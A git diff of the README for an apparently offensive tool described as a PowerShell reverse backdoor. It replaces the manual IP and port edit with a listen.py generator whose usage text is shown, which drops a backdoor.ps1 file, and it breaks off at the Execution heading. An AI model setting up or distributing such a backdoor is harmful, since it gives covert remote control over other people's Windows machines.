@@ -17,13 +17,22 @@ A Powershell Reverse Backdoor
 * Get Windows Update Status
 
 # Setup
-Find the class Backdoor, and change the following lines 
-```powershell
-class Backdoor {
-  # Change this to the correct ip/port
-  [string]$ipAddress = "127.0.0.1"
-  [int]$port = 4444
+Don't change the code inside template.ps1, instead run listen.py
 ```
+usage: listen.py [-h] [--ip-address IP_ADDRESS] [--port PORT] [--out-file OUT_FILE] [--verbose]
+
+Powershell Backdoor
+
+options:
+  -h, --help            show this help message and exit
+  --ip-address IP_ADDRESS, -I IP_ADDRESS
+                        IP Address to bind to default: xxx.xxx.x.xx (your local ip)
+  --port PORT, -p PORT  Port to connect over default:4444
+  --out-file OUT_FILE, -O OUT_FILE
+                        Generated backdoor filename
+  --verbose             Show verbose output
+```
+No arguments are required, backdoor.ps1 will be dropped in the current working directory.
 
 # Execution
 ```cmd
